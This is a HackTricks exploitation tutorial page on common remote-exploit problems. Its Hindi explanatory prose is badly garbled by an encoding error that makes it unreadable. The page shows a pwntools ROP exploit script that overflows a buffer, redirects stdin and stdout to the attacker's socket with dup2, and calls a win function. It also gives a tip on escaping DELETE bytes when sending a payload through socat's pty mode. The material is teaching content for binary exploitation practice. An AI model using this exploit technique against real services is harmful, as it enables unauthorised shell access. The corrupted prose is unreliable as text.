# рд╕рд╛рдорд╛рдиреНрдп рд╢реЛрд╖рдг рд╕рдорд╕реНрдпрд╛рдПрдБ

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **рд╣рдорд╛рд░рд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}

## рджреВрд░рд╕реНрде рд╢реЛрд╖рдг рдореЗрдВ FDs

рдЬрдм рдПрдХ рджреВрд░рд╕реНрде рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рд╢реЛрд╖рдг рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ **`system('/bin/sh')`** рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрд╣ рд╕рд░реНрд╡рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛, рдФрд░ `/bin/sh` stdin (FD: `0`) рд╕реЗ рдЗрдирдкреБрдЯ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░реЗрдЧрд╛ рдФрд░ stdout рдФрд░ stderr (FDs `1` рдФрд░ `2`) рдореЗрдВ рдЖрдЙрдЯрдкреБрдЯ рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдЧрд╛ред рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рд╢реЗрд▓ рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдЧрд╛ред

рдЗрд╕рдХрд╛ рдПрдХ рд╕рдорд╛рдзрд╛рди рдпрд╣ рд╣реИ рдХрд┐ рдорд╛рди рд▓рд┐рдпрд╛ рдЬрд╛рдП рдХрд┐ рдЬрдм рд╕рд░реНрд╡рд░ рд╢реБрд░реВ рд╣реБрдЖ, рддреЛ рдЙрд╕рдиреЗ **FD рд╕рдВрдЦреНрдпрд╛ `3`** (рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП) рдмрдирд╛рдИ рдФрд░ рдлрд┐рд░, рдЖрдкрдХрд╛ рдХрдиреЗрдХреНрд╢рди **FD рд╕рдВрдЦреНрдпрд╛ `4`** рдореЗрдВ рд╣реЛрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рдпрд╣ syscall **`dup2`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ stdin (FD 0) рдФрд░ stdout (FD 1) рдХреЛ FD 4 (рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдХрдиреЗрдХреНрд╢рди рд╡рд╛рд▓рд╛) рдореЗрдВ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рддрд╛рдХрд┐ рдпрд╣ рд╢реЗрд▓ рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХреЗ рдЬрдм рдпрд╣ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛред 

[**рдпрд╣рд╛рдБ рд╕реЗ рд╢реЛрд╖рдг рдЙрджрд╛рд╣рд░рдг**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ socat рдкрд╣рд▓реЗ рд╕реЗ рд╣реА `stdin` рдФрд░ `stdout` рдХреЛ рд╕реЙрдХреЗрдЯ рдкрд░ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, `pty` рдореЛрдб **DELETE рд╡рд░реНрдгреЛрдВ** рдХреЛ **рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк `\x7f` ( `DELETE` -) рднреЗрдЬрддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдЖрдкрдХреЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рдкрд┐рдЫрд▓реЗ рд╡рд░реНрдг рдХреЛ **рд╣рдЯрд╛ рджреЗрдЧрд╛**ред

рдЗрд╕рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП **рдХрд┐рд╕реА рднреА рднреЗрдЬреЗ рдЧрдП `\x7f` рдХреЗ рдкрд╣рд▓реЗ **escape character `\x16`** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред**

**рдпрд╣рд╛рдБ рдЖрдк** [**рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред**

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
